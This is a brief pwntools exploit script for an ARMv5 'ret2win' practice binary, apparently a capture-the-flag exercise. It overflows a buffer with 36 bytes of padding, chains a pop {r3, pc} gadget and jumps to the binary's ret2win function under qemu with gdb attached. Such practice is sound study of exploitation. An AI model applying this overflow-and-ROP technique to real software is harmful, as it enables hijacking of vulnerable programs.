from pwn import *

context.arch = "arm"

elf = ELF("./ret2win_armv5")

gs = """
gef-remote --qemu-user --qemu-binary ./ret2win_armv5 localhost 1234
""" + "file " + elf.path

io = process(["qemu-arm","-g","1234", elf.path])
gdb.attach(io, gdbscript=gs)

rop = ROP(elf)

# 0x000103a4 : pop {r3, pc}
io.sendline(b"A" * 36 + \
        p32(0x000103a4) + \
        p32(0xdeadbeef) + \
        p32(elf.symbols["ret2win"]))

io.interactive()
